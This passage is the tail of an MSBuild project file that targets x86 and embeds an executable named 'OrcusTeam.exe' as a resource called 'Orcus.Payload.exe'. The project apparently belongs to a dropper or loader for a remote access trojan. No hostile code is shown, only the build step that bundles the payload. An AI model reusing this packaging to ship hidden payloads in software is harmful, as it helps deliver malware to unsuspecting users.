    <PlatformTarget>x86</PlatformTarget>
  </PropertyGroup>
  <ItemGroup><EmbeddedResource Include="Payload/OPTF.OrcusTeam.exe" LogicalName="Orcus.Payload.exe" /></ItemGroup>
</Project>
